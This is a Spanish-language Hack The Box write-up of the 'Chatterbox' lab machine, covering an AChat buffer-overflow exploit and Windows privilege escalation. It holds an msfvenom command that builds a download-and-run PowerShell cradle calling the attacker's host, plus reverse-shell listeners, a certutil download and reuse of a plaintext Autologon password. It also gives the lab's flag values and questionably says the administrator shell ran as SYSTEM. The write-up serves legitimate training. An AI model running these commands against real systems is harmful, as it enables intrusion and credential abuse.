---
tags:
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/123
dificultad: Media
ip: 10.10.10.74
os: Windows
linked:
  - "[[Achat]]"
  - "[[Buffer Overflow]]"
  - "[[Icacls Abuse]]"
  - "[[PowerUp Enumeration]]"
  - "[[msfvenom]]"
  - "[[PowerShell Download Cradle]]"
  - "[[Process execution as another user]]"
  - "[[Powershell Credentials Manipulation]]"
  - "[[Lolbins Binary]]"
---
# HackTheBox - Chatterbox

## Reconocimiento

### Escaneo de Puertos con Nmap

Inicié la fase de reconocimiento con un escaneo de puertos exhaustivo sobre la dirección IP `10.10.10.74` utilizando **Nmap**. Empleé los siguientes parámetros para asegurar un escaneo rápido y efectivo: `-p-` para analizar todos los 65535 puertos, `--min-rate=1000` para acelerar el proceso y `-sV` para la detección de versiones de los servicios.
```Bash
nmap -p- --min-rate=1000 -sV 10.10.10.74
```

Los resultados revelaron varios puertos abiertos, pero dos de ellos captaron mi atención de inmediato:
```
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows
```

> [!info] Superficie de Ataque Principal
> 
> Los puertos 9255 y 9256 están ejecutando un servicio llamado AChat chat system. Este software, al no ser un servicio estándar de Windows, se convirtió en mi principal objetivo para la enumeración de vulnerabilidades.


---

## Análisis de vulnerabilidades

### Buffer Overflow Remoto en AChat

Tras identificar el software **AChat**, realicé una búsqueda de exploits públicos asociados a este servicio. Rápidamente encontré una vulnerabilidad de **Remote Buffer Overflow** que afecta a la versión **0.150 beta 7**.

Descargué el Proof-of-Concept (PoC) directamente desde Exploit-DB:
```Bash
curl https://www.exploit-db.com/download/36025 -o 36025.py
```

Al analizar el código del exploit en Python, noté que estaba diseñado para ser una plantilla. Era necesario generar mi propio _shellcode_ y modificar el script para apuntar a la IP de la máquina víctima. La vulnerabilidad de _Buffer Overflow_ me permitiría enviar una cantidad de datos superior a la que el buffer de la aplicación puede manejar, sobrescribiendo la pila de ejecución y redirigiendo el flujo del programa para ejecutar mi propio código malicioso (_shellcode_).


---

## Explotación de vulnerabilidades

### Preparación del Payload

Mi estrategia consistió en utilizar un [payload](https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1) que me proporcionara una _reverse shell_ a través de PowerShell. Para ello, descargué un script de PowerShell conocido:
```Bash
curl https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/3ad91872713d60888dca95850c3f6e706231cb40/powershell_reverse_shell.ps1 -o rev_shell.ps1
```

A continuación, usé `msfvenom` para generar el _shellcode_. Este _shellcode_ no contendría la _reverse shell_ completa, sino una instrucción para que la máquina víctima descargara y ejecutara mi script `rev_shell.ps1` alojado en mi máquina.

Este es el comando que utilicé para generar el _shellcode_, asegurándome de evitar los _bad characters_ comunes y de codificarlo correctamente para la arquitectura de destino:
```Bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://<MI_IP>/rev_shell.ps1')\"" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

> [!IMPORTANT]
> 
> Reemplacé el shellcode genérico del script 36025.py por el que generé con msfvenom. También modifiqué la IP del objetivo en el script para que apuntara a 10.10.10.74 y mi IP local en el script de PowerShell.

### Ejecución del Exploit

Con todo preparado, seguí estos pasos para la explotación:

1. **Levanté un servidor web** en mi máquina para alojar el script `rev_shell.ps1`:    
    ```Bash
    python3 -m http.server 80
    ```
    
2. **Puse un listener de Netcat** a la escucha en el puerto `1337` (previamente configurado en `rev_shell.ps1`) para recibir la conexión entrante:
    ```Bash
    nc -nvlp 1337
    ```
    
3. **Ejecuté el exploit** de Python modificado:
    ```Bash
    python 36025.py
    ```

Tras unos segundos, recibí una conexión en mi listener, obteniendo una shell en el sistema como el usuario `alfred`.


---

## Escalada de privilegios

### Enumeración con PowerUp

Una vez dentro del sistema, mi objetivo era escalar privilegios a `Administrator`. Transferí y ejecuté el script de enumeración [PowerUp.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1) para buscar vectores de escalada comunes en sistemas Windows.

El script reveló un hallazgo crítico: credenciales de `Autologon` almacenadas en el registro de Windows.

> [!warning] Credenciales en Texto Plano
> 
> La funcionalidad de Autologon de Windows permite iniciar sesión automáticamente, pero para ello almacena el nombre de usuario y la contraseña en texto plano en el registro. Esto representa un grave riesgo de seguridad, ya que cualquier usuario con acceso local puede leer estas credenciales.

La contraseña encontrada era `Welcome1!`. Mi hipótesis fue que esta contraseña podría ser reutilizada para la cuenta de `Administrator`.

### Obtención de Shell como Administrator

Confirmé que la contraseña `Welcome1!` era válida para el usuario `Administrator`. Para obtener una shell con estos privilegios, preparé un nuevo script de _reverse shell_ en PowerShell, esta vez configurado para conectarse a un puerto diferente (ej: `4444`).

1. **Transferí el nuevo script** a la máquina víctima usando `certutil`, un binario de sistema (LOLBin) que me permite descargar archivos desde una URL:
    ```PowerShell
    # Desde la shell de alfred en la víctima
    certutil -urlcache -split -f http://<MI_IP>/admin_shell.ps1 C:\ProgramData\admin_shell.ps1
    ```
    
2. **Creé un objeto de credenciales** en PowerShell. Dado que la máquina víctima utilizaba PowerShell v2.0, tuve que construir el objeto `PSCredential` de una manera compatible con esta versión:
    ```PowerShell
    $passwd = New-Object System.Security.SecureString
    'Welcome1!'.ToCharArray() | ForEach-Object { $passwd.AppendChar($_) }
    $creds = New-Object System.Management.Automation.PSCredential("administrator", $passwd)
    ```
    
3. **Inicié un nuevo listener de Netcat** en mi máquina, esta vez en el puerto `4444`:
    ```Bash
    nc -nvlp 4444
    ```
    
4. Finalmente, **ejecuté el script de reverse shell usando las credenciales de Administrator** a través del comando `Start-Process`:
    ```PowerShell
    Start-Process -FilePath "powershell" -ArgumentList "-ExecutionPolicy Bypass -File C:\ProgramData\admin_shell.ps1" -Credential $creds
    ```
    

Inmediatamente, recibí una conexión en mi segundo listener, esta vez con una shell con privilegios de `NT AUTHORITY\SYSTEM`, completando así la escalada de privilegios.


---

## Bandera(s)

> [!flag] `flag{user}`
> 652c82e5983b035f29225cbe602a7791
^bandera-user

> [!flag] `flag{root}`
> 78770ad8e9968eddb731f3ab7f8a1519
^bandera-root
